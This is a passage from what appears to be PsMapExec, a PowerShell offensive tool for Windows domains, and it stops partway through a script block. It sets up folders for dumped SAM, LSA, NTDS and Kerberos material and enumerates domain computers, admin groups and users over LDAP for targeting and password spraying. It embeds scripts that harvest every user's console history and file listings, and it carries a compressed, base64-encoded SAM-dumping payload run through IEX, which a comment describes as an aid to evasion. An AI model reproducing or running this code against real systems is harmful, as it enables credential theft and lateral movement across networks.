            [string]$OS,
            [System.ConsoleColor]$statusColor = 'White',
            [string]$statusSymbol = "",
            [string]$statusText = "",
            [int]$NameLength,
            [int]$OSLength,
            [string]$successfulProtocols
        )

        # Prefix
        switch ($Method) {
            "SMB" { Write-Host "SMB" -ForegroundColor "Yellow" -NoNewline }
            "WMI" { Write-Host "WMI" -ForegroundColor "Yellow" -NoNewline }
            "WinRM" { Write-Host "WinRM" -ForegroundColor "Yellow" -NoNewline }
            "All" { Write-Host "ALL" -ForegroundColor "Yellow" -NoNewline }
            "GenRelayList" { Write-Host "GenRelayList" -ForegroundColor "Yellow" -NoNewline }
            "SessionHunter" { Write-Host "SessionHunter" -ForegroundColor "Yellow" -NoNewline }
            "VNC" { Write-Host "VNC" -ForegroundColor "Yellow" -NoNewline }
        }
    
        Write-Host "   " -NoNewline

        # Resolve IP
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping
        $Result = $Ping.Send($ComputerName, 15)
        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
        else {
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }

        # Display ComputerName and OS
        Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
        Write-Host "   " -NoNewline
        Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
        Write-Host "   " -NoNewline

        # Display status symbol and text
        Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
        Write-Host $statusText
    }

    ################################################################################################################
    ########################################### Initial Directory Setup ############################################
    ################################################################################################################

    $WorkingDirectory = (Get-Item -Path ".\").FullName

    try {
        $testFilePath = Join-Path $WorkingDirectory "Test.PME"
        New-Item -ItemType "File" -Name "Test.PME" -Path $WorkingDirectory -Force -ErrorAction "Stop" | Out-Null
        Remove-Item -Path $testFilePath -Force | Out-Null
    }
    catch {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Current directory is not writable, change to a different directory and try again"
        return
    }

    $PME = Join-Path $WorkingDirectory "PME"
    $SAM = Join-Path $PME "SAM"
    $MSSQL = Join-Path $PME "MSSQL"
    $LogonPasswords = Join-Path $PME "LogonPasswords"
    $SMB = Join-Path $PME "SMB"
    $Tickets = Join-Path $PME "Tickets"
    $KerbDump = Join-Path $Tickets "KerbDump"
    $MimiTickets = Join-Path $Tickets "MimiTickets"
    $ekeys = Join-Path $PME "eKeys"
    $LSA = Join-Path $PME "LSA"
    $ConsoleHistory = Join-Path $PME "Console History"
    $Sessions = Join-Path "$PME" "Sessions"
    $UserFiles = Join-Path "$PME" "User Files"
    $Spraying = Join-Path $PME "Spraying"
    $VNC = Join-Path $PME "VNC"
    $NTDS = Join-Path $PME "NTDS"

    $directories = @(
        $PME, $SAM, $LogonPasswords, $MSSQL, $SMB, $Tickets, $ekeys, 
        $LSA, $KerbDump, $MimiTickets, $ConsoleHistory, $Sessions, 
        $UserFiles, $Spraying, $VNC, $NTDS
    )

    foreach ($directory in $directories) {
        if (-not (Test-Path $directory)) {
            New-Item -ItemType Directory -Force -Path $directory | Out-Null
            if ($directory -eq $PME) {
                Write-Host
                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                Write-Host "Created directory for PME at $directory"
                Write-Host
                Start-sleep -seconds "3"
            }
        }
    }

    ################################################################################################################
    ################################### Loads ticket functions into memory #########################################
    ################################################################################################################

    if (!$CurrentUser -or $SprayHash) {
        if (-not (Get-Command 'Invoke-rTickets' -ErrorAction "SilentlyContinue")) {
            Write-Verbose "Loading ticket function"
            try {
                if ($global:rbs) {
                    Invoke-Expression -Command $global:rbs
                }
                else {
                    Write-Warning "rbs script block is null"
                }
            }
            catch {}
        }
        else {
            Write-Verbose "Ticket function already loaded"
        }
    }





    ################################################################################################################
    ##################################### Ticket logic for authentication ##########################################
    ################################################################################################################
    # Set the userDomain when impersonating a user in one domain for access to an alternate domain
    # Can't remember where I was going with this...
    if ($UserDomain -ne "") {}

    if (!$CurrentUser -and $Module -ne "Amnesiac") { Write-verbose "Obtaining current user ticket" ; GetCurrentUserTicket }
    if (!$CurrentUser) { Write-verbose "Processing ticket" ; ProcessTicket }

    ################################################################################################################
    ########################################## Domain Target Acquisition ###########################################
    ################################################################################################################

    function Establish-LDAPSession {
        param (
            [Parameter(Mandatory = $true)]
            [string]$Domain,

            [string]$DomainController  # Optional parameter for domain controller
        )

        if ($DomainController -and -not $DomainController.Contains(".")) {
            $DomainController = "$DomainController.$Domain"
        }

        # Define LDAP parameters
        $ldapServer = if ($DomainController) { $DomainController } else { $Domain }
        $ldapPort = 389 # Use 636 for LDAPS (SSL)

        # Load necessary assembly
        try { Add-Type -AssemblyName "System.DirectoryServices.Protocols" } Catch {}

        try {
            # Create LDAP directory identifier
            $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ldapServer, $ldapPort)

            # Establish LDAP connection as current user
            $ldapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)

            # Use Negotiate (Kerberos or NTLM) for authentication
            $ldapConnection.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

            # Bind (establish connection)
            $ldapConnection.Bind()  # Bind as the current user
            Write-Verbose "LDAP Bind successful to $Domain"
        }
        catch {
            Write-Error "Failed to establish LDAP connection to '$ldapServer'. Error: $_"
            RestoreTicket
            continue
        }
    }

    if ($DomainController -ne "") {
        Establish-LDAPSession -Domain $Domain -DomainController $DomainController
    }
    else {
        Establish-LDAPSession -Domain $Domain
    }



    function New-Searcher {
        $directoryEntry = [ADSI]"LDAP://$domain"
        $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
        $searcher.PageSize = 1000
        $searcher.PropertiesToLoad.Add("dnshostname") > $null
        $searcher.PropertiesToLoad.Add("operatingSystem") > $null
        return $searcher
    }

    if ($Method -ne "Spray") {
        if (!$IPAddress) {
            $searcher = New-Searcher
            $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))

            if ($Targets -match "^\*.*|.*\*$") {
                Write-Verbose "Obtaining wildcard computers (Enabled) from LDAP query"
                $wildcardFilter = $Targets -replace "\*", "*"
                $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(dnshostname=$wildcardFilter))"
                $computers = $searcher.FindAll() | Where-Object {
                    $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
                }
            } 
        
            elseif ($Targets -eq "Workstations") {
                if ($Global:TargetsWorkstations -ne $null) {
                    $Computers = $Global:TargetsWorkstations | Select-Object *
                }
                else {
                    Write-Verbose "Obtaining Workstations (Enabled) from LDAP query"
                    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                    $computers = $searcher.FindAll() | Where-Object {
                        $_.Properties["operatingSystem"][0] -notlike "*windows*server*" -and
                        $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
                    }
                }

                $Global:TargetsWorkstations = $computers | Select-Object *
        
            } 
        
            elseif ($Targets -eq "Servers") {
                if ($Global:TargetsServers -ne $null) {
                    $computers = $Global:TargetsServers | Select-Object *
                }
                else {
                    Write-Verbose "Obtaining Servers (Enabled) from LDAP query"
                    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"
                    $computers = $searcher.FindAll() | Where-Object {
                        $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
                    }
                }

                $Global:TargetsServers = $computers | Select-Object *
        
            } 
        
            elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
                if ($Global:TargetsDomainControllers -ne $null) {
                    $computers = $Global:TargetsDomainControllers | Select-Object *
                }
                else {
                    Write-Verbose "Obtaining Domain Controllers (Enabled) from LDAP query"
                    $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                    $computers = $searcher.FindAll()
                }

                $Global:TargetsDomainControllers = $computers | Select-Object *
        
            } 
        
            elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
                if ($Global:TargetsAll -ne $null) {
                    $computers = $Global:TargetsAll | Select-Object *
                }
                else {
                    Write-Verbose "Obtaining all (Enabled) systems from LDAP query"
                    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                    $computers = $searcher.FindAll() | Where-Object {
                        $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
                    }
                }

                $computers = $Global:TargetsAll = $computers | Select-Object *
        
            } 
        
            elseif ($Targets -notmatch "\*") {
                if ($IsFile) {
                    $fileContent = Get-Content -Path $Targets
                    $computers = @()

                    foreach ($line in $fileContent) {
                        # Split the line by comma and trim any spaces
                        $names = $line -split ',' | ForEach-Object { $_.Trim() }

                        foreach ($name in $names) {
                            if ([string]::IsNullOrWhiteSpace($name)) {
                                continue
                            }

                            if ($name -notlike "*.*") {
                                $name += ".$domain"
                            }

                            $searcher.Filter = "(dnshostname=$name)"
                            $result = $searcher.FindOne()

                            if ($result -ne $null) {
                                $computers += $result.GetDirectoryEntry()
                            }
                            else {
                                Write-Warning "No LDAP entry found for $name"
                            }
                        }
                    }
                }
                else {
                    Write-Host "Targets : $Targets"
                    if ($Targets -notlike "*.*") {
                        $Targets += ".$domain"
                    }
                    $searcher.Filter = "(dnshostname=$Targets)"
                    $result = $searcher.FindOne()

                    if ($result -ne $null) {
                        $computers = @($result.GetDirectoryEntry())
                    }
                    else {
                        Write-Host
                        Write-Warning "No LDAP entry found for the computer: $Targets"
                        $computers = @()
                        RestoreTicket
                        continue
                    }
                }
            }
        }
    
        # Ensure we only have unique entries. Mostly to resolve duplicate entries from file
        $computers = $computers | Select-Object -Unique *
    
        $ComputerCount = ($Computers).Count
        Write-Verbose "Total number of objects queried: $ComputerCount"
    }



    Write-Output ""

    ################################################################################################################
    ############################ Grab interesting users for various parsing functions ##############################
    ################################################################################################################


    function Get-GroupMembers {
        param ([string]$GroupName)
    
        $searcher = New-Searcher
        $searcher.PropertiesToLoad.AddRange(@("member"))
        $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
        $group = $searcher.FindOne()
        $members = @()

        if ($group -ne $null -and $group.Properties["member"]) {
            foreach ($memberDN in $group.Properties["member"]) {
                $searcher.Filter = "(distinguishedName=$memberDN)"
                $searcher.PropertiesToLoad.Clear()
                $searcher.PropertiesToLoad.AddRange(@("samAccountName", "objectClass"))
                $object = $searcher.FindOne()

                if ($object -and $object.Properties["objectClass"] -contains "user") {
                    $samName = $object.Properties["samAccountName"]
                    if ($samName -and $samName.Count -gt 0) {
                        $members += $samName[0].ToString()
                    }
                }
            }
        }

        return $members
    }

    if ($Module -eq "LogonPasswords" -or $Module -eq "eKeys" -or ($Module -eq "KerbDump" -and !$NoParse)) {
        $FQDNDomainName = $domain.ToLower()

        if ($null -eq $global:DomainAdmins) {
            Write-Verbose "Getting members from the Domain Admins group"
            $global:DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
            $FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\$_" }
        }

        if ($null -eq $global:EnterpriseAdmins) {
            Write-Verbose "Getting members from the Enterprise Admins group"
            $global:EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
            $FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
        }

        if ($null -eq $global:ServerOperators) {
            Write-Verbose "Getting members from the Server Operators group"
            $global:ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
            $FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
        }

        if ($null -eq $global:AccountOperators) {
            Write-Verbose "Getting members from the Account Operators group"
            $global:AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue
            $FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }
        }
    }


    if ($Method -eq "Spray") {
    
        Write-Verbose "Performing user LDAP queries for method (Spray)"
        $searcher = New-Searcher
        $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
        $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }

        if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users") {
            $Targets = $EnabledDomainUsers
        }
        elseif ($Targets -in $EnabledDomainUsers) {
            $EnabledDomainUsers = $Targets
        }
        else {
            $groupMembers = Get-GroupMembers -GroupName $Targets
            if ($groupMembers.Count -gt 0) {
                $EnabledDomainUsers = $groupMembers
            }
            elseif ($groupMembers.Count -eq 0) {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Group either does not exist or is empty"
                return
            }
            else {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Unspecified Error"
                return
            }
        }
    }


    # Grab Computer Accounts for spraying
    function Get-ComputerAccounts {
        Write-Verbose "Obtaining Computer Accounts (For Spraying) from LDAP"
        $searcher = New-Searcher
        $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
    
        try {
            $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
            return $ComputerSamAccounts
        }
        catch {
            Write-Error "Failed to fetch computer accounts. Error: $_"
            return $null
        }
    }
    # Not needed at the moment
    #$ComputerSamAccounts = Get-ComputerAccounts


    if (!$LocalAuth) {
        if ($Method -ne "RDP") {
            if (!$Force) {
                foreach ($EnterpriseAdmin in $EnterpriseAdmins) {
                    $splitResult = $Username -split [regex]::Escape($EnterpriseAdmin)
                    if ($splitResult.Count -gt 1) {
                        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Specified user is a Enterprise Admin. Use the -Force switch to override"
                        RestoreTicket
                        
                        return
                    }
                }
            }

            if (!$Force) {
                foreach ($DomainAdmin in $DomainAdmins) {
                    $splitResult = $Username -split [regex]::Escape($DomainAdmin)
                    if ($splitResult.Count -gt 1) {
                        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Specified user is a Domain Admin. Use the -Force switch to override"
                        RestoreTicket
                        
                        return
                    }
                }
            }
        }

        if (!$CurrentUser) {
            if ($Method -ne "GenRelayList") {
                if ($Method -ne "SessionHunter") {
                    if ($Method -ne "Spray") {
                        try {
                            $searcher = New-Searcher
                            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
                            $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
                            $user = $searcher.FindOne()
                            $domainUser = $user.Properties["samAccountName"]
                        }
                        Catch {
           
                            if ($Ticket -ne $null) {} 
                            elseif (!$DomainUser) {
                                Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                                Write-Host "Specified username is not a valid domain user"
                                return
                
                            }
                        }
                    }
                }
            }
        }
    }

    ################################################################################################################
    ################################## Information based on selected module ########################################
    ################################################################################################################

    if ($Method -eq "SessionHunter") {
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Searching for systems where privileged users' credentials might be in running memory"
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Filtering by those for which we have admin rights"
        Write-Host
        Start-Sleep -Seconds 3
    }

    $moduleMessages = @{
        "KerbDump"       = "Tickets will be written to $KerbDump"
        "Tickets"        = "Tickets will be written to $MimiTickets"
        "LSA"            = "LSA output will be written to $LSA"
        "ekeys"          = "eKeys output will be written to $ekeys"
        "SAM"            = "SAM output will be written to $SAM"
        "LogonPasswords" = "LogonPasswords output will be written to $LogonPasswords"
        "ConsoleHistory" = "Console History output will be written to $ConsoleHistory"
        "Files"          = "File output will be written to $UserFiles"
        "NTDS"           = "NTDS output will be written to $NTDS"
    }

    if ($moduleMessages.ContainsKey($Module)) {
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host $moduleMessages[$Module]
    
        if (!$ShowOutput) {
            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Use -ShowOutput to display results in the console"
            ""
        }
    }
    elseif ($Method -eq "GenRelayList") {
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "SMB Signing output will be written to $SMB"
    }


    ################################################################################################################
    ######################################## Local scripts and modules #############################################
    ################################################################################################################

    $ConsoleHostHistory = @'
Write-Output ""
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$foundHistoryFile = $false

foreach ($User in $Users) {
    $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
        $foundHistoryFile = $true

        $historyContent = Get-Content -Path $historyFilePath -Raw
        $historyLines = $historyContent -split "`n"
        Write-output ""
        Write-output "-----[$User]-----"
        $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
    }
}

if (-not $foundHistoryFile) {
    Write-Output "No Results"
}

'@



    $Files = @'
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")

foreach ($user in $users) {
    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
    $userHome = $user.FullName

    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue

    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }

    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0

    if ($hasFiles) {
        Write-Host ""
        Write-Host "----------------------------------------------------------------------------------------------"
        Write-Host ("[User] $user")

        if ($downloadsFiles.Count -gt 0) {
        ""
            Write-Host ("[Downloads]")
            $downloadsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($documentsFiles.Count -gt 0) {
        ""
            Write-Host ("[Documents]")
            $documentsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($desktopFiles.Count -gt 0) {
        ""
            Write-Host ("[Desktop]")
            $desktopFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($homeFiles.Count -gt 0) {
        ""
            Write-Host ("[Home]")
            $homeFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }
        Write-Host "----------------------------------------------------------------------------------------------"
    }
}
'@


    # The scripts below are compressed to help aid in basic evasion

    # Highly compressed revision of this script: https://github.com/The-Viper-One/PME-Scripts/blob/main/DumpSAM.ps1
    $LocalSAM = @'
Write-Output "" ; function DumpSAM{$gz="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";$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$c=New-Object System.IO.MemoryStream;$b.CopyTo($c);$d=[System.Text.Encoding]::UTF8.GetString($c.ToArray());$b.Close();$a.Close();$c.Close();$d|IEX}DumpSAM
'@

    # Highly compressed revision of this script: https://github.com/The-Viper-One/PME-Scripts/blob/main/Invoke-NETMongoose.ps1
    $Mongoose = @'
